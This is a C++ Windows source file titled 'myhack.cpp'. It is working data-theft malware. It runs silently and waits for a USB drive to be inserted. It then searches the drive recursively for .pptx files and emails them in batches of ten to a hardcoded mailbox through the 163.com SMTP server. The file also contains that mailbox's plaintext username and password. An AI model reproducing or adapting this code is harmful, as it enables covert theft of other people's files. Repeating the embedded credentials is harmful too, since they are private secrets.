// myhack.cpp : Defines the entry point for the application.
//
#define _AFXDLL
#include <afx.h>
#include "smtp.h"
#include <iterator>
#include <string>
//#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>

bool getUDisk();
void MyFindFile(CString,CString);
vector<string> file;
char diskPath[5] = { 0 };


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	if(!getUDisk())
		return -1;
	CSmtp smtp(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","13618688056@163.com",
			"你大哥来信","");

	//CSmtp smtpfilelist(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","137764477@qq.com",
	//		"文件列表"," ");
	//MyFindFile(diskPath,"ppt");
	MyFindFile(diskPath,"pptx");
	vector<string>::iterator it = file.begin();
	//	sprintf(str,"%d",file.size());
	//	MessageBox(NULL,str,"",MB_OK);
	int len10 = file.size()/10;
	for(int i = 0; i< len10; ++i)
	{
		for(int j = 0; j< 10 ; ++j,++it)
		{
			smtp.AddAttachment(*(it));
		}
		
		smtp.SendEmail_Ex();
		//MessageBox(NULL,"","",MB_OK);
		smtp.DeleteAllAttachment();
		Sleep(6000);
		//MessageBox(NULL,"","",MB_OK);
	}
	for(; it != file.end(); ++it)
	{
		//sprintf(str,"%s",(*it));
		//MessageBox(NULL,str,"",MB_OK);
		smtp.AddAttachment((*it));
		
	}
	
	int err = 0;
	if((err = smtp.SendEmail_Ex()) !=0 )
	{
		/*
		if (err == -1)    
            cout << "错误-1: 没有目地邮箱地址!" << endl;    
        if (err == 1)    
            cout << "错误1: 由于网络不畅通，发送失败!" << endl;    
        if (err == 2)    
            cout << "错误2: 用户名错误,请核对!" << endl;    
        if (err == 3)    
            cout << "错误3: 用户密码错误，请核对!" << endl;    
        if (err == 4)    
            cout << "错误4: 请检查附件目录是否正确，以及文件是否存在!" << endl;
			*/
		return -1;
	}
	return 0;
}

void MyFindFile(CString strPath,CString strType)
{
	CFileFind fd;
	CString strDir = strPath+"\\*.*";
	bool bRet = true;
	bRet = fd.FindFile(strDir,0);
	while(bRet)
	{
		//cout<<"hello"<<endl;
		bRet = fd.FindNextFile();
		if(fd.IsDots())
		{
			continue;
		}
		if(fd.IsDirectory())
		{
			MyFindFile(fd.GetFilePath(),strType);
		}else{
			CString str = fd.GetFilePath();
			if(str.Right(strType.GetLength()).Compare(strType)==0)
			{
				file.push_back((string)(str.GetBuffer(str.GetLength())));
			}
		}
	}
}

bool getUDisk()
{
	//Sleep(60000);
	while(true)
	{
		DWORD allDisk = GetLogicalDrives();
		if (allDisk!=0)
		{
			
			for (int i=0;i<24;i++)     //假定最多有10个磁盘
			{
				if ((allDisk & 1)==1)
				{
					sprintf( diskPath, "%c", 'C'+i );
					strcat( diskPath, ":" );
					
					if ( GetDriveType(diskPath)==DRIVE_REMOVABLE )
					{
						//AfxMessageBox( "检测到U盘", MB_OK );
						//AfxMessageBox( diskPath, MB_OK );
						
						if( GetVolumeInformation(diskPath,0,0,0,0,0,0,0) ) //判断驱动是否准备就绪
						{
							//printf("U盘准备就绪!");
							
							return true;
						}
					}
				}
				
				allDisk = allDisk>>1;
			}	
		}
		Sleep(6000);
	}
	return false;
}

